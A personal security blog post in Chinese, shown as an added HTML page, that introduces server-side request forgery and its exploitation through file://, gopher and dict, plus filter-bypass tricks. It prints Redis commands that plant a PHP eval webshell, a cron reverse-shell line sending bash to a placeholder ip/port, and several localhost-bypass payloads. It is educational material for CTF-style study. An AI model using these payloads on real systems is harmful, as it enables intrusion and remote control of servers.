@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言很早就接触了SSRF，但当时只是停留在做题，没有对SSRF进行深入思考，这次记录一下SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探ssrf">
+<meta property="og:url" content="http://example.com/2021/02/01/%E5%88%9D%E6%8E%A2ssrf/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言很早就接触了SSRF，但当时只是停留在做题，没有对SSRF进行深入思考，这次记录一下SSRF">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/02/wANHOiVaxcmezq2.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/01/94hSFKma6ksD1xy.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/01/kTyNzKAutirCJow.png">
+<meta property="article:published_time" content="2021-02-01T11:24:22.000Z">
+<meta property="article:modified_time" content="2024-09-08T04:01:18.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/02/wANHOiVaxcmezq2.png">
+
+
+<link rel="canonical" href="http://example.com/2021/02/01/%E5%88%9D%E6%8E%A2ssrf/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/02/01/%E5%88%9D%E6%8E%A2ssrf/","path":"2021/02/01/初探ssrf/","title":"初探ssrf"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>初探ssrf | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">SSRF漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="nav-number">1.2.</span> <span class="nav-text">可能存在的场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E5%90%88file-%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.1.</span> <span class="nav-text">结合file:&#x2F;&#x2F;协议读取本地文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E5%90%88gopher%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.2.</span> <span class="nav-text">结合gopher协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Egopher"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">关于gopher</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E6%89%93Redis"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">gopher打Redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E6%89%93Mysql"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">gopher打Mysql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E6%89%93fastcgi"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">gopher打fastcgi</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.3.</span> <span class="nav-text">dict协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-number">1.4.</span> <span class="nav-text">绕过手法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.6.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/01/%E5%88%9D%E6%8E%A2ssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="初探ssrf | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初探ssrf
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-02-01 19:24:22" itemprop="dateCreated datePublished" datetime="2021-02-01T19:24:22+08:00">2021-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 12:01:18" itemprop="dateModified" datetime="2024-09-08T12:01:18+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很早就接触了SSRF，但当时只是停留在做题，没有对SSRF进行深入思考，这次记录一下SSRF </p>
+<span id="more"></span>
+
+<h2 id="SSRF漏洞简介"><a href="#SSRF漏洞简介" class="headerlink" title="SSRF漏洞简介"></a>SSRF漏洞简介</h2><p>SSRF漏洞简单来说就是利用服务器去发起请求然后返回内容，利用这个我们可以进行内网资源获取。</p>
+<p>从先知上找到的一张图（如下</p>
+<p><img src="https://i.loli.net/2021/02/02/wANHOiVaxcmezq2.png" alt="ssrf.png"></p>
+<h2 id="可能存在的场景"><a href="#可能存在的场景" class="headerlink" title="可能存在的场景"></a>可能存在的场景</h2><ul>
+<li>分享功能</li>
+<li>在线翻译</li>
+<li>图片加载和下载</li>
+<li>转码服务</li>
+<li>文章收藏加载</li>
+<li>api加载远程资源</li>
+<li>……..</li>
+</ul>
+<p>请求服务器资源的地方都有可能会存在SSRF </p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="结合file-协议读取本地文件"><a href="#结合file-协议读取本地文件" class="headerlink" title="结合file:&#x2F;&#x2F;协议读取本地文件"></a>结合file:&#x2F;&#x2F;协议读取本地文件</h3><p>这个用的比较熟练也比较，最常见的利用形式就是<code>?url=file://etc/passwd</code>  直接读取本地密码文件</p>
+<h3 id="结合gopher协议"><a href="#结合gopher协议" class="headerlink" title="结合gopher协议"></a>结合gopher协议</h3><h4 id="关于gopher"><a href="#关于gopher" class="headerlink" title="关于gopher"></a>关于gopher</h4><p><strong>gopher常见利用</strong></p>
+<p>常见的就是利用gopher去攻击 <code>redis、mysql、php的fastcgi等</code></p>
+<p>一开始接触协议的时候，我很懵，不知道究竟是什么东西，直到看了有关计算机网络的书，才算是有一点点理解。协议是通信规则，并且有自己的格式，通信双方得按照它的规则和格式来。</p>
+<ul>
+<li><p>再此之前，我们需要了解一下 gopher协议</p>
+<p><code>gopher</code>协议是一种信息查找系统，他将<code>Internet</code>上的文件组织成某种索引，方便用户从<code>Internet</code>的一处带到另一处。在<code>WWW</code>出现之前，<code>Gopher</code>是<code>Internet</code>上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<code>tcp70</code>端口。但在<code>WWW</code>出现后，<code>Gopher</code>失去了昔日的辉煌。现在它基本过时，人们很少再使用它。它只支持文本，不支持图像</p>
+</li>
+</ul>
+<p>gopher协议的格式：<code>gopher://ip:port/_TCP/IP数据流</code>   示例如下：</p>
+<p>我在自己的VPS上监听端口，然后利用docker容器 去发送数据：</p>
+<p><img src="https://i.loli.net/2021/02/01/94hSFKma6ksD1xy.png" alt="123.png"></p>
+<p>可以看到成功通信。</p>
+<p><strong>利用gopher协议发送 get http请求</strong></p>
+<p>   需要的格式:</p>
+<ul>
+<li>url编码</li>
+<li>换行用<code>%0d%0a</code> 代替</li>
+<li>结束需要加上<code>%0d%0a</code></li>
+</ul>
+<p>测试demo:</p>
+<p><code>curl gopher://ip:80/_GET%20/demo.php%3fceshi=hello%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a</code></p>
+<p>其中<code>demo.php</code>内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ceshi&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>可以拿到回显。</p>
+<p><strong>利用gopher协议发送 POST http请求</strong></p>
+<p>和<code>get</code> 传参大致差不多，不过有些区别，POST必须得包含 <code>Content-Type、Content-Length、Host、post的参数数据</code></p>
+<h4 id="gopher打Redis"><a href="#gopher打Redis" class="headerlink" title="gopher打Redis"></a>gopher打Redis</h4><p>gopher打redis是比较常见的考点，理解这个需要清楚</p>
+<ul>
+<li>redis是什么东西</li>
+<li>C-S模式流量包的概念</li>
+</ul>
+<p>对redis最直观的印象，就是它和mysql一样都是数据库，但是它是轻量级的，key-value 类型的数据库。</p>
+<p>对于它我没有做很深层次的了解，只是这里为了学习SSRF，顺带了解了一下。</p>
+<p>方式一：直接写木马</p>
+<p>这里我们是可以利用 redis 客户端，来对根目录写马的，要求是客户端用户的权限能够往web目录里面写东西。</p>
+<p>通过设置变量，值为一句话木马，从而写入dump.rdb 文件中，将该文件存在的路径改为web根目录，同时将文件改名为shell.php即可。</p>
+<p>需要用到的命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set m &quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到web根目录成功写入：</p>
+<p><img src="https://i.loli.net/2021/02/01/kTyNzKAutirCJow.png" alt="11111.png"></p>
+<p>然后就是C-S流量包，我们客户端输入命令实质就是发送一个请求流量包，然后服务端对我们的请求流量包进行相应。我们在redis-cli执行的一些命令通过wireshark抓包是可以抓取到流量的。</p>
+<p>所以利用gopher打redis的核心就是，伪造流量包，利用gopher协议去发送这个流量包，流量包格式得符合gopher 的格式。</p>
+<p>然后非授权打redis，就是不需要密码直接可以访问redis客户端，没有对身份进行验证。</p>
+<p>方式二：反弹shell</p>
+<p>这个方式在debian、ubuntu环境下不可行，但是在Centos下可行。</p>
+<p>本质上和写Webshell差不多，这里就是把反弹shell命令写入了定时任务中。具体的Redis命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n&#x27;   //ip和port为接受的vps</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是伪造流量包，github上有一个工具：<code>https://github.com/tarunkant/Gopherus.git</code>  直接 <code>git clone 下载</code>，帮我们将流量包已写好并编码，十分方便。</p>
+<h4 id="gopher打Mysql"><a href="#gopher打Mysql" class="headerlink" title="gopher打Mysql"></a>gopher打Mysql</h4><p>这里的思想和gopher攻击redis是一致的，也是想办法去伪造流量包。(按照mysql通信协议和格式）这里我们也可以直接用gopherus工具生成。当然这里也是对mysql客户端的权限有要求，如果是对web目录去写一句话，需要有写权限。（未授权就是不需要密码直接登录）</p>
+<h4 id="gopher打fastcgi"><a href="#gopher打fastcgi" class="headerlink" title="gopher打fastcgi"></a>gopher打fastcgi</h4><p>利用条件：</p>
+<ul>
+<li>libcurl版本&gt;&#x3D;7.45.0</li>
+<li>PHP-FPM监听端口</li>
+<li>PHP-FPM版本 &gt;&#x3D; 5.3.3</li>
+<li>知道服务器上任意一个已存在php文件的绝对路径</li>
+</ul>
+<p>主要是利用php-fpm，这里是也是伪造流量包，按照 fastcgi通信协议的格式，最后在转换成gopher格式，编码。可以造成任意命令执行。</p>
+<p>也可以利用gopherus这个工具进行伪造。</p>
+<p>以上三者都是按照通信协议和格式(比如Redis是按照RESP协议通信）来伪造流量包，然后按照gopher协议的格式转换一下，最后打过去。</p>
+<h3 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h3><p>字典协议，我们可以利用它来进行端口探测。</p>
+<p>协议格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/命令:参数</span><br></pre></td></tr></table></figure>
+
+<p>与gopher有一个区别是，它是一条一条命令执行，而gopher可以多条命令执行。</p>
+<h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><p>一般可能会存在着过滤，对目标url进行一定限制。我们可以想办法突破限制</p>
+<ul>
+<li><p>进制转换，限制了ip，我们可以用8进制，2进制，16进制，10进制进行转换 网址<code>https://tool.520101.com/wangluo/jinzhizhuanhuan/</code></p>
+</li>
+<li><p>突破<code>127.0.0.1</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.1 </span><br><span class="line">127.1</span><br><span class="line">127.127.127.127</span><br><span class="line">0</span><br><span class="line">0.0.0.0</span><br><span class="line">127.0.0.1.xip.io/</span><br><span class="line">http://[::]未复现成功。。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>302跳转 – 我们在自己的vps上构造一个php文件 (相当于一个中间人，跳转绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>DNS-Rebinding (</p>
+</li>
+<li><p>使用句号代替点(比如127。0。0。1)</p>
+</li>
+<li><p>利用DNS解析（在域名上是设置A记录，指向127.0.0.1）</p>
+</li>
+<li><p>php对url解析问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://xxx@127.0.0.1/flag.php?.myangs&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="comment">//返回结果</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;xxx&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/flag.php&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;.myangs&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>……</p>
+</li>
+</ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一开始觉得用一篇文章去描述整个SSRF，现在发现还是得分开细说，糅杂在一篇文章上可能没耐心看233333（</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><code>https://bbs.ichunqiu.com/thread-58455-1-1.html</code></p>
+<p><code>https://xz.aliyun.com/t/6993#toc-0</code></p>
+<p><code>https://r1dd1er.top/2019/11/02/SSRF%E4%B8%8ERedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</code></p>
+<p><code>https://www.cnblogs.com/Konmu/p/12984891.html</code></p>
+<p><code>https://blog.csdn.net/qq_41107295/article/details/103026470</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/29/%E2%80%9C%E8%9A%81%E6%99%AF%E6%9D%AF%E2%80%9DWUSTCTF2021%E6%96%B0%E7%94%9F%E8%B5%9Bweb/" rel="prev" title="“蚁景杯”WUSTCTF2021新生赛web">
+                  <i class="fa fa-angle-left"></i> “蚁景杯”WUSTCTF2021新生赛web
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/03/DNS-Rebinding%E6%94%BB%E5%87%BB/" rel="next" title="DNS-Rebinding攻击">
+                  DNS-Rebinding攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
